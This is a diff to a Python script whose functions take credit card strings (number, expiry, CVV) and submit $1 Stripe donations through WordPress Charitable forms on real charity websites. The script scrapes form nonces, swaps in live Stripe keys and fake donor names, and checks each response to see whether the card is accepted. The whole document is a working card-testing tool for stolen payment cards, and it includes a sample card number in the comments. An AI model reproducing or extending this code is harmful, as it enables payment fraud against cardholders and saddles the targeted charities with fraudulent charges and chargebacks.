+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+            'x-requested-with': 'XMLHttpRequest',
         }
-        data = f'charitable_form_id={form_id}&{form_id}=&_charitable_donation_nonce={donation_nonce}&_wp_http_referer=%2Fcampaigns%2Fcrfev%2Fdonate%2F&campaign_id={campaign_id}&description=Conservation+and+Research+Fund+e.V.+(CRF)&ID={donation_id}&donation_amount=custom&custom_donation_amount=1&first_name=Tiana&last_name=Jakubowski&email={email}&address=24+George+Street&address_2=&city=Racie&state=New+South+Walet&postcode=2000&country=DE&phone=%2B61290123456&gateway=stripe&stripe_payment_method={pm}&action=make_donation&form_action=make_donation'
-        response = requests.post(
-    'https://keepnaturealive.de/wp-admin/admin-ajax.php',
-    cookies=cookies,
-    headers=headers,
-    data=data,#, proxies=proxy, timeout=30)    
-        )
+        
+        data = {
+            'charitable_form_id': f'{form_id}',
+            f'{form_id}': '',
+            '_charitable_donation_nonce': f'{donation_nonce}',
+            '_wp_http_referer': '/campaigns/donate-clothing-blankets-household-goods-etc/donate/',
+            'campaign_id': f'{campaign_id}',
+            'description': 'Donate Clothing, Blankets, Household Goods, etc.',
+            'ID': f'{donation_id}',
+            'gateway': 'stripe',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'address': '',
+            'address_2': '',
+            'city': '',
+            'state': '',
+            'postcode': '',
+            'country': 'US',
+            'phone': '',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
+        }
+        
+        response = requests.post('https://gods-dna.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
         if "secret" in response.text:
             print("✅ req3 required. Continue with next step...")
             response_str = response.text
@@ -1776,7 +1804,7 @@ def go8(cc_input: str) -> str:
             data = {
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
-    'key': 'pk_live_51IadOaEenfgvdQ2uXrRsYOOGtj97lmwqWGAGCtiInGBKVfoSRTZ4na9IT93C1Bje98an0IJIOIsOzhAbqZbqH3ue00ZrQ8wltR',
+    'key': 'pk_live_51P5cEKLPKIuFJVL21f177uGwZrTmpfiNidDlHNtbaOpcXEUTmDB5ibBvKW5O37ahAyfBzuTNQ4QiAJHn3BLmmBTx00ja35XFdT',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -2223,7 +2251,8 @@ def go11(cc_input: str) -> str:
     'sec-fetch-site': 'same-site',
     'user-agent': user,
         }
-        response = requests.get('https://altaseadsconservancy.org/campaigns/operations/', headers=headers)
+        
+        response = requests.get('https://www.altaseadsconservancy.org/campaigns/operations/', headers=headers)
         form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
         donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
         campaign_id = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
@@ -2946,5 +2975,18 @@ def go14(cc_input: str) -> str:
         print(f"Error occurred: {e}")
 #================================        
 #test_card = "5196032149064509|01|27|915"
+#print(go0(test_card))
+#print(go1(test_card))
+#print(go2(test_card))
+#print(go3(test_card))
 #print(go4(test_card))
-# magnicharity.org
+#print(go5(test_card))
+#print(go6(test_card))
+#print(go7(test_card))
+#print(go8(test_card))
+#print(go9(test_card))
+#print(go10(test_card))
+#print(go11(test_card))
+#print(go12(test_card))
+#print(go13(test_card))
+#print(go14(test_card))
